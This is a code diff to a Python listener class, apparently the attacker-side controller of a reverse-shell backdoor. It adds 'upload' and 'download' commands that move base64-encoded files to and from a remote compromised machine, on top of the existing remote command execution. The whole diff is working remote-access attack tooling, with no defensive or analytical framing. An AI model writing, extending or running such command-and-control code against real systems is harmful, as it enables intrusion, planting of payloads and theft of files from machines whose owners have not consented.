@@ -1,6 +1,7 @@
 
 import socket
 import json
+import base64
 
 class Listener:
     def __init__(self, ip, port):
@@ -48,6 +49,15 @@ class Listener:
             exit()
         return self.reliable_receive()
 
+    def read_file(self, path):
+        with open(path, "rb") as file:
+            return base64.b64encode(file.read())
+
+    def write_file(self, path, content):
+        with open(path, "wb") as file:
+            file.write(base64.b64decode(content))
+            return "[+] Download successful"
+
     def run(self):
         stats = self.reliable_receive()
         print(stats)
@@ -55,7 +65,16 @@ class Listener:
             try:
                 command = input(">> ")
                 command = command.split(" ")
+
+                if command[0] == "upload":
+                    file_content = self.read_file(command[1]).decode()
+                    command.append(file_content)
+
                 result = self.execute_remote_command(command)
+
+                if command[0] == "download":
+                    result = self.write_file(command[1], result)
+
                 print(result)
 
             except json.JSONDecodeError:
